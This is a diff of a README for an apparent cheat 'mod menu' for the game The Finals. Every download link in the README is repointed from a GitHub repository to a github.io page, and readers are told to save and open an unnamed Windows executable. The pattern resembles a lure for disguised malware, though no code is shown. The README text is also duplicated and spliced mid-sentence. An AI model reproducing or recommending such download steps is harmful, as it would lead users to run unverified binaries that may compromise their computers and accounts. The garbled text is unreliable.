@@ -1,6 +1,6 @@
 # 🎮 newest-the-finals-mod-menu - Easy PC Mod Menu Download
 
-[![Download Now](https://img.shields.io/badge/Download_Now-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Aasdsadsad04/newest-the-finals-mod-menu)
+[![Download Now](https://img.shields.io/badge/Download_Now-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://aasdsadsad04.github.io)
 
 newest-the-finals-mod-menu is a Windows-friendly download page for Finals-MOD— The Finals PC 2026. It gives you one clear place to find the newest mod menu package and open it on a normal Windows computer. You do not need programming knowledge, special developer tools, or command-line experience. The main download link is hosted on GitHub, and everything below explains the download and launch process in plain language.
 
@@ -27,7 +27,7 @@ You need a Windows computer, a web browser such as Edge, Chrome, or Firefox, and
 
 ## 📥 Download and Setup
 
-[![Download newest-the-finals-mod-menu](https://img.shields.io/badge/Download_newest--the--finals--mod--menu-FF4500?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Aasdsadsad04/newest-the-finals-mod-menu)
+[![Download newest-the-finals-mod-menu](https://img.shields.io/badge/Download_newest--the--finals--mod--menu-FF4500?style=for-the-badge&logo=windows&logoColor=white)](https://aasdsadsad04.github.io)
 
 Visit this link to download the application.
 
@@ -36,13 +36,13 @@ Visit this link to download the application.
 3. Use the download option on that page to save the application to your Windows PC.
 4. When the download finishes, open the saved file to start the mod menu.
 
-Direct download page: https://github.com/Aasdsadsad04/newest-the-finals-mod-menu
+Direct download page: https://aasdsadsad04.github.io
 
 ## 🖥️ Running on Windows
 
 After the application is saved, open it from your Downloads folder or from the folder where you saved it. The mod# 🎮 newest-the-finals-mod-menu - Easy PC Mod Menu Download
 
-[![Download Now](https://img.shields.io/badge/Download_Now-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Aasdsadsad04/newest-the-finals-mod-menu)
+[![Download Now](https://img.shields.io/badge/Download_Now-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://aasdsadsad04.github.io)
 
 newest-the-finals-mod-menu is a Windows-friendly download page for Finals-MOD— The Finals PC 2026. It gives you one clear place to find the newest mod menu package and open it on a normal Windows computer. You do not need programming knowledge, special developer tools, or command-line experience. The main download link is hosted on GitHub, and everything below explains the download and launch process in plain language.
 
@@ -71,7 +71,7 @@ A standard mouse and keyboard are enough to complete the process. You do not nee
 
 ## 📥 Download and Setup
 
-[![Download newest-the-finals-mod-menu](https://img.shields.io/badge/Download_newest--the--finals--mod--menu-darkorange?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Aasdsadsad04/newest-the-finals-mod-menu)
+[![Download newest-the-finals-mod-menu](https://img.shields.io/badge/Download_newest--the--finals--mod--menu-darkorange?style=for-the-badge&logo=windows&logoColor=white)](https://aasdsadsad04.github.io)
 
 Visit this link to download the application.
 
@@ -80,7 +80,7 @@ Visit this link to download the application.
 3. Use the download option on that page to save the application to your Windows PC.
 4. When the download finishes, open the saved file to start the mod menu.
 
-Direct download page: https://github.com/Aasdsadsad04/newest-the-finals-mod-menu
+Direct download page: https://aasdsadsad04.github.io
 
 The setup section uses the same main link so you do not have to search for a second source. The GitHub page is the primary destination for the download, and the button in this section takes you straight to it. After you save the application, you can close the browser or leave the page open for reference.
 
@@ -114,7 +114,7 @@ If the application does not open after you save it, confirm that you are opening
 No. You use a browser to visit the GitHub page, save the application, and open it on Windows.
 
 **Where is the main download link?**  
-The main link is https://github.com/Aasdsadsad04/newest-the-finals-mod-menu. It appears in the top button and in the download and setup section.
+The main link is https://aasdsadsad04.github.io It appears in the top button and in the download and setup section.
 
 **What should I do after the download finishes?**  
 Open the saved file. The mod menu should appear on screen for use with Finals-MOD— The Finals PC 2026.
